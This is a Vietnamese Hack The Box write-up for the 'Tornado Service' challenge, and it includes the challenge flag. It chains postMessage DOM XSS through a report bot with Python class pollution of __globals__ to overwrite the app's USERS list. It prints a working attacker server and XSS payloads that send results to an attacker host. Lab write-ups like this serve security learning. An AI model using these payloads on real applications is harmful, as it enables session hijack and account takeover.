---
title: "Tornado Service"
slug: "htb-tornado-service"
platform: "Hack The Box"
difficulty: "Medium"
vulnerabilities: ["Cross-Site Scripting","Python Class Pollution"]
publishedAt: "2026-09-14"
summary: "Phân tích bot xem báo cáo, giao tiếp giữa cửa sổ trình duyệt và API quản lý Tornado."
draft: false
sortOrder: 8
---
bot visit attacker page -> attacker page mở localhost dashboard -> postMessage -> DOM XSS trên localhost origin -> từ same-origin mới fetch JSON tới /update_tornado -> overwrite USERS -> login

## Overview
Đây là một challenge xoay quanh việc kết hợp report bot, postMessage-based DOM XSS và Python class pollution. Challenge có các yếu tố:
- **app**: cung cấp dashboard Tornado xem danh sách machine, cập nhập đăng nhập
- **report bot**: dùng headless Chrome truy cập url do users kiểm soát 
- **dashboard frontend**: lắng nghe postMessage nma lại k ktra origin và render dữ liệu bằng innerHTML
## Review source and Vulnerability
**main.py**
1. CORS đang quá rộng cho basebandle 
![image](https://hackmd.io/_uploads/Hy2_GAy6bl.png)
nó cho phép mọi domain gọi api
2. **/update_tornado**
![image](https://hackmd.io/_uploads/HktGSCJTbl.png)
3. **/report_tornado**
![image](https://hackmd.io/_uploads/rJ70BAJp-e.png)
4.**/login**
![image](https://hackmd.io/_uploads/ry-7cRya-e.png)
5. **/stats**: Không verify gì ngoài cookie chỉ cần cookie -> vào được(Cookie_secret random mỗi lần app boot)
![image](https://hackmd.io/_uploads/Sk7-jAk6We.png)
**challenge/application/util/general.py**
![image](https://hackmd.io/_uploads/SyQGaAJpWe.png)
**challenge/application/static/js/tornado-service.js**
![image](https://hackmd.io/_uploads/Sy73kkgp-e.png)
đây là những dòng có thể bị XSS vì nếu kiểm soát được code đưa thẳng vào innerHTML và có thể thực thi JS
![image](https://hackmd.io/_uploads/H1TzZ1lT-e.png)
listerner lại nhận object rồi append luôn vào DOM
**bot.py**
![image](https://hackmd.io/_uploads/ryGEmJl6bl.png)
nó thực sự sẽ mở url và chạy 10 giây
## Bot thực thi JS trong origin 
Đầu tiên ta test lại cái việc nó ghép tham số ip thẳng vào url như đã nói ở trên
![image](https://hackmd.io/_uploads/HyCF_yxTbl.png)
Ta host một server nhỏ để xem lệnh get vào **/agent_details**
![image](https://hackmd.io/_uploads/H1_2dJlpWg.png)
![image](https://hackmd.io/_uploads/rJMR_Jl6be.png)
![image](https://hackmd.io/_uploads/r11JKJlTZl.png)
=> BOT visit attacker-controlled page rồi
từ đây. Ta thực hiện test tiếp theo để xem bot có render html và chạy js không để bt là bot k chỉ fetch một cách mù hay chỉ request đến
![image](https://hackmd.io/_uploads/By-K0Jlp-e.png)
![image](https://hackmd.io/_uploads/SJ0YA1xa-x.png)
ta host một sv như sau
=>>> có một callback **get /cb?mjs-start** tức là html k chỉ được tải mà còn được render và JS đã chạy
Quay lại đoạn 
![image](https://hackmd.io/_uploads/H1TzZ1lT-e.png)
nó nhận data mình gửi và render bằng inner HTML
Giờ mình sẽ host server bằng code sau để xác nhận XSS nổ hay k
```python=
from http.server import BaseHTTPRequestHandler, HTTPServer

ATTACKER_HOST = "host.docker.internal"
PORT = 8000

HTML = f"""<!doctype html>
<html>
<body>
<h1>attacker page</h1>

<iframe id="dash" src="http://127.0.0.1:1337/" style="width:1px;height:1px;border:0"></iframe>

<script>
const frame = document.getElementById("dash");

frame.addEventListener("load", () => {{
  setTimeout(() => {{
    frame.contentWindow.postMessage({{
      machine_id: '<img src=x onerror="this.src=\\'http://{ATTACKER_HOST}:{PORT}/collect?origin=\\'+encodeURIComponent(location.origin)">',
      ip_address: '1.1.1.1',
      status: 'active'
    }}, '*');
  }}, 1500);
}});
</script>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] GET {self.path}")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        if self.path.startswith("/agent_details"):
            self.wfile.write(HTML.encode())
        elif self.path.startswith("/collect"):
            self.wfile.write(b"collected")
        else:
            self.wfile.write(b"ok")

HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
```
![image](https://hackmd.io/_uploads/H17YGee6bl.png)
location origin đã trả ra **http://127.0.0.1:1337** đã chứng tỏ XSS đã chạy ở trong app nội bộ
## Từ XSS sang state corruption
Trong main.py, các file quan trọng đã giải thích ở trên. **/update_tornado** chỉ cho request  từ localhost => nếu ép bot/browser nội bộ gửi request này hộ thì có thể sửa objject bên trong. Và bug ở login cũng đã nói ở trên, giờ mình chỉ cần điều khiển user đầu là ăn.
Giờ ta chỉ cần thay cái machine_id bằng cái payload dưới đây
```html=
machine_id = f"""<img src=x onerror="var i=this;
fetch('/get_tornados')
  .then(r => i.src='http://{ATTACKER_HOST}:{PORT}/collect?step=21&status=' + r.status)
  .catch(e => i.src='http://{ATTACKER_HOST}:{PORT}/collect?step=21&err=fetch-failed')">"""
```
Đây là test mình đã đọc được api nội bộ của app và ra được kết quả 200 gọi thành công fetch vào đây
![image](https://hackmd.io/_uploads/SkA_-We6We.png)
nó có nhiều kết quả vì mỗi lần thẻ được tạo hoặc bot refresh
Giờ ta muốn tác động đến route **/update_tornado**. Nhánh này cho phép nếu target hiện tại là object và key k đi vào nhanh recurse => key nào mình gửi cũng thành attribute mới của **TornadoObject** được =>mình thử thêm một field mới ví dụ owned="yes"  và đã thành công
![image](https://hackmd.io/_uploads/r1kbvWxabx.png)
tornado là một object instance thật trong list TORNADOSS
=> tornado.__class__.__init__.__globals__ = dict biến global của file chứa hàm
trong __globals__ lại có biến global như USERS và mình có thể đè thẳng vào đây vì tính đệ quy đã giải thích ở trên
```html=
machine_id = f"""<img src=x onerror="var i=this;
fetch('/update_tornado', {{
  method: 'POST',
  headers: {{'Content-Type':'application/json'}},
  body: JSON.stringify({{
    machine_id: '{MID}',
    __class__: {{
      __init__: {{
        __globals__: {{
          USERS: [
            {{
              username: 'lean@tornado-service.htb',
              password: 'phase2pass'
            }}
          ]
        }}
      }}
    }}
  }})
}})
.then(r => r.text())
.then(t => i.src='http://{ATTACKER_HOST}:{PORT}/collect?step=24&ok=' + encodeURIComponent(t))
.catch(e => i.src='http://{ATTACKER_HOST}:{PORT}/collect?step=24&err=failed')">"""
```
code cuối để sửa vào USERS và với bản debug thì ta có thể thấy rõ ở log
![image](https://hackmd.io/_uploads/Hkx9u-lp-x.png)
=>>> global USERS overwrite
## Lấy flag thôi
Giờ có user chỉ lấy cookie qua **/login** và gọi **/stats** là ăn rồi
![image](https://hackmd.io/_uploads/HyB9qZla-x.png)
Tuy nhiên trong lúc làm instance thì phát hiện ra bot truy cập http  nên dễ bị mix content/downgrade scheme => dùng segfault như a trung chỉiii
![image](https://hackmd.io/_uploads/SkStrGeTWe.png)

![image](https://hackmd.io/_uploads/Bk8uSGgTbx.png)
flag: **HTB{s1mpl3_stuff_but_w1th_4_tw15t!}**